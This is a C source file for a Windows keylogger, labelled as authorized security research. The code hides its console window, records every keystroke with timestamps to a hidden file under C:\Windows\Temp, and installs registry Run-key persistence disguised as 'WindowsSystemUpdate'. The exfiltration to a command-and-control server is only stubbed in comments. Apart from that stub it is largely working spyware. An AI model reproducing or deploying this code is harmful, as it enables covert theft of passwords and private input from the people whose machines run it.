/*
 * Demonstrates: Windows API hooking, file hiding, registry persistence
 * FOR AUTHORIZED SECURITY RESEARCH ONLY
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#define LOG_FILE "C:\\Windows\\Temp\\syslog.txt"
#define HIDDEN_ATTR (FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)

// Virtual key code to string mapping
const char* get_key_name(int vk_code) {
    static char key_name[32];
    
    switch(vk_code) {
        case VK_SPACE: return "[SPACE]";
        case VK_RETURN: return "[ENTER]";
        case VK_BACK: return "[BACKSPACE]";
        case VK_TAB: return "[TAB]";
        case VK_SHIFT: return "[SHIFT]";
        case VK_CONTROL: return "[CTRL]";
        case VK_MENU: return "[ALT]";
        case VK_CAPITAL: return "[CAPS]";
        case VK_ESCAPE: return "[ESC]";
        case VK_END: return "[END]";
        case VK_HOME: return "[HOME]";
        case VK_LEFT: return "[LEFT]";
        case VK_UP: return "[UP]";
        case VK_RIGHT: return "[RIGHT]";
        case VK_DOWN: return "[DOWN]";
        case 0x30: case 0x31: case 0x32: case 0x33: case 0x34:
        case 0x35: case 0x36: case 0x37: case 0x38: case 0x39:
            sprintf(key_name, "%c", vk_code);
            return key_name;
        case 0x41: case 0x42: case 0x43: case 0x44: case 0x45: case 0x46:
        case 0x47: case 0x48: case 0x49: case 0x4A: case 0x4B: case 0x4C:
        case 0x4D: case 0x4E: case 0x4F: case 0x50: case 0x51: case 0x52:
        case 0x53: case 0x54: case 0x55: case 0x56: case 0x57: case 0x58:
        case 0x59: case 0x5A:
            sprintf(key_name, "%c", vk_code);
            return key_name;
        default:
            sprintf(key_name, "[%02X]", vk_code);
            return key_name;
    }
}

void hide_log_file() {
    /* Set hidden and system attributes to avoid casual detection */
    SetFileAttributes(LOG_FILE, HIDDEN_ATTR);
}

void add_to_startup() {
    /* Persistence via Registry Run key */
    HKEY hKey;
    const char* exe_path = "C:\\Windows\\System32\\keylog.exe";
    
    // Copy self to system directory (simulated)
    
    if (RegOpenKeyEx(HKEY_CURRENT_USER, 
                     "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                     0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        
        RegSetValueEx(hKey, "WindowsSystemUpdate", 0, REG_SZ,
                      (BYTE*)exe_path, strlen(exe_path) + 1);
        RegCloseKey(hKey);
    }
}

void log_keystroke(int vk_code) {
    FILE* fp;
    time_t now;
    char timestamp[64];
    
    time(&now);
    strftime(timestamp, sizeof(timestamp), "[%Y-%m-%d %H:%M:%S]", localtime(&now));
    
    fp = fopen(LOG_FILE, "a");
    if (fp) {
        fprintf(fp, "%s %s\n", timestamp, get_key_name(vk_code));
        fclose(fp);
        hide_log_file();
    }
}

int is_key_pressed(int vk_code) {
    /* Check if key state changed from not pressed to pressed */
    return (GetAsyncKeyState(vk_code) & 0x8000) != 0;
}

void exfiltrate_logs() {
    /* Simulate sending logs to C2 server */
    /* In real malware: HTTP POST or DNS tunneling */
    FILE* fp = fopen(LOG_FILE, "r");
    if (fp) {
        // Simulated exfiltration
        // char buffer[4096];
        // while (fgets(buffer, sizeof(buffer), fp)) {
        //     send_to_c2(buffer);
        // }
        fclose(fp);
        
        // Clear logs after exfiltration
        // fopen(LOG_FILE, "w"); 
    }
}

int main(int argc, char* argv[]) {
    /* Hide console window */
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
    
    /* Establish persistence */
    add_to_startup();
    
    /* Main keylogging loop */
    int last_key_state[256] = {0};
    int current_key_state;
    time_t last_exfil = time(NULL);
    
    while (1) {
        /* Check all virtual key codes */
        for (int vk = 8; vk <= 255; vk++) {
            current_key_state = is_key_pressed(vk);
            
            /* Detect key press (transition from 0 to 1) */
            if (current_key_state && !last_key_state[vk]) {
                log_keystroke(vk);
            }
            
            last_key_state[vk] = current_key_state;
        }
        
        /* Periodic exfiltration (every 5 minutes) */
        if (difftime(time(NULL), last_exfil) > 300) {
            exfiltrate_logs();
            last_exfil = time(NULL);
        }
        
        /* Reduce CPU usage */
        Sleep(10);
    }
    
    return 0;
}
